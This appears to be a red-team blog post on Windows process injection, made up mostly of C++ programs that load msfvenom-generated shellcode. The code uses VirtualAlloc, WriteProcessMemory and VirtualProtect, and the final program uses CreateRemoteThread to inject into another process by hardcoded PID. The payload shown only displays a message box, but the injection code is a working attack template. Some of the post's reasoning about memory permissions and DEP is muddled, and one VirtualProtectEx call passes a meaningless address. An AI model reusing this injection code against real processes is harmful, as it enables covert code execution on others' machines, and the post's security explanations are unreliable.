---
layout: post
title: "Process Injection without Write/Execute Permission"
featured-img: Process_Injection\shane-rounce-205187
categories: [cpp, shellcode, redteam, process injection]
---

My friend [@joezid](https://joezid.github.io/) and I have had a boring time, so we found we can execute shellcode in a non-executable and write a shellcode in a non-writable.



# IDEA

We were thinking about the permissions. and Is it possible to write our shellcode in a non-writable allocation and execute it in a non-executable allocation? So we decided to research it and try to create a binary to check the permission. 

# NORMAL BEHAVIOR

We created a shellcode that's popup a message box through msfvenom. After that, we made a binary to do self-injection with a normal behavior (READ, WRITE and EXECUTE) permission.

```cpp
#include <stdio.h>
#include <Windows.h>

int main()
{
    unsigned char shellcode[] =
        "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
        "\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
        "\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
        "\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
        "\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
        "\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
        "\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
        "\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
        "\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
        "\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
        "\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
        "\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
        "\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
        "\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"
        "\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3"
        "\x68\x70\x77\x6e\x58\x68\x52\x65\x74\x32\x31\xc9\x88\x4c\x24"
        "\x07\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff"
        "\x55\x08";

    void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    ((void(*)())exec)();

    return 0;
}

```

![screenshot_1](Process_Injection/cpp_normal_behavier.png)


The next step is to compile -> run -> see what will happen.    

![screenshot_2](Process_Injection/cpp_normal_behavier_executed.png)


As expected our shellcode executed normally into the memory with no issue because we already giving it a READ, WRITE and EXECUTE permission.  

# PWN SELF INJECTION


## WRITE

Now we'll try to write our shellcode in a non-writable allocation by giving the allocation **PAGE_EXEUTE_READ** permission.  


```cpp

#include <stdio.h>
#include <Windows.h>

int main()
{
    unsigned char shellcode[] =
        "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
        "\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
        "\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
        "\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
        "\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
        "\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
        "\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
        "\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
        "\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
        "\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
        "\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
        "\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
        "\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
        "\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"
        "\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3"
        "\x68\x70\x77\x6e\x58\x68\x52\x65\x74\x32\x31\xc9\x88\x4c\x24"
        "\x07\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff"
        "\x55\x08";


    void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READ);
    printf("[+] Allocation created successfully %p \n", exec);

    if (WriteProcessMemory(GetCurrentProcess(), exec, shellcode, sizeof(shellcode), NULL)) {
        printf("[+] Shellcode wrote successfully.");
    }
    else {
        printf("[-] No permission to write the shellcode.");
    }
    return 0;
}
```

![screenshot_3](Process_Injection/cpp_write_the_shellcode.png)

The next step is to compile -> run -> see what will happen.    



![screenshot_4](Process_Injection/cpp_write_the_shellcode_executed.png)

OH Perfect, we wrote our shellcode successfully. That means we can write in a non-writable allocation.  


## EXECUTE

Now we'll try to execute our shellcode in a non-executable allocation by giving the allocation **PAGE_READONLY** permission.   


```cpp
#include <stdio.h>
#include <Windows.h>

int main()
{
    unsigned char shellcode[] =
        "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
        "\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
        "\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
        "\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
        "\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
        "\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
        "\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
        "\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
        "\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
        "\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
        "\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
        "\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
        "\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
        "\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"
        "\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3"
        "\x68\x70\x77\x6e\x58\x68\x52\x65\x74\x32\x31\xc9\x88\x4c\x24"
        "\x07\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff"
        "\x55\x08";

    DWORD OldProction;
    void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READ);
    printf("[+] Allocation created successfully %p \n", exec);

    if (WriteProcessMemory(GetCurrentProcess(), exec, shellcode, sizeof(shellcode), NULL)) {
        printf("[+] Shellcode wrote successfully. \n");
        
        
        if (VirtualProtect(exec, sizeof(exec), PAGE_READONLY, &OldProction)) {
            printf("[+] Permission changed successfully. \n");
            ((void(*)())exec)();
        }
        else {
            printf("[-] Cannot change the permission. \n");
        }
    }
    else {
        printf("[-] No permission to write the shellcode. \n");
    }
    return 0;
}

```
![screenshot_5](Process_Injection/cpp_execute_the_shellcode.png)

The next step is to compile -> run -> see what will happen.    

![screenshot_5](Process_Injection/Failed.png)

Hmmm, We changed the permission successfully and at the same, we failed to execute our shellcode!!  

## DEBUG

After taking a look at what is happens in the background we found the binary goes perfectly until executing the shellcode when it starts to execute the shellcode fails immediately because the Data Execution Prevention (DEP) protection is enabled.  
That means we cannot execute a shellcode into the memory because the DEP is blocking any kind of shell coding to run in the memory.  

![screenshot_6](Process_Injection/crash.png)


So our next step will be to disable the DEP protection option and recompile it.  

![screenshot_7](Process_Injection/Disable_DEP.png)


![screenshot_7](Process_Injection/cpp_execute_the_shellcode_executed.png)

OH yo-yo, as we expected our shellcode executed normally into the memory 🔥🔥   

Now we have a proof of concept. So what will happen if we modified our application to do a process injection for a process running without DEP protection? let's see what will happen in this situation.  


# PWN PROCESS INJECTION


We made a binary that takes a PID manually.  
PID will be any process running without DEP protection.  
```cpp 
#include <stdio.h>
#include <Windows.h>

int main(int argc, char* argv[])
{
    unsigned char shellcode[] =
        "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
        "\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
        "\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
        "\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
        "\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
        "\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
        "\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
        "\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
        "\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
        "\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
        "\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
        "\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
        "\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
        "\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"
        "\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3"
        "\x68\x70\x77\x6e\x58\x68\x52\x65\x74\x32\x31\xc9\x88\x4c\x24"
        "\x07\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff"
        "\x55\x08";

    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;
    DWORD oldPerms;
    DWORD PID = 17968;
    printf("Injecting to PID: %i", PID);
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
    VirtualProtectEx(processHandle, (LPVOID)sizeof(processHandle), sizeof(shellcode), PAGE_READONLY, &oldPerms);
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);

    return 0;
}
```


The next step is to compile -> run -> see what will happen.   

![screenshot_8](Process_Injection/Injected.png)

Yup, we injected our shellcode successfully without writable/executable allocation.  



_________________________

Hazem Hisham (Ret2pwn)| [@Twitter](https://twitter.com/RET2_pwn) | [@LinkedIn](https://www.linkedin.com/in/hazem-hesham/)

Yossef Zidann | [@Twitter](https://twitter.com/yossefzidann) | [@LinkedIn](https://www.linkedin.com/in/joezid/)